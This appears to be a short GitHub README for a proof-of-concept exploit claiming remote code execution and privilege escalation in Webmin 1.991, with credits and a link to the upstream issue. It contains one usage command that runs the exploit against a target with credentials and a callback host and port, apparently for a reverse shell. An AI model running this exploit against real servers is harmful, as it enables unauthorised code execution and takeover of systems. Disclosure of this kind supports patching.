# rce_webmin
RCE and privilege escalation webmin version 1.991


# poc:

```bash
/usr/bin/env /bin/python ./exploit.py -u 'https://localhost:10000' -un 'safeusername' -pw 'safeuserpassword' -rh 'localhost' -rp 4445
```
# credits 

Thanks to the people below we got this:

V1s3r1on for finding the CVE with me. 

@chris001 for helping us out with the CVE numbers.

Rajchowdhury420 for fixing the SSL errors in console.


Track the issue here:

https://github.com/webmin/webmin/issues/1635
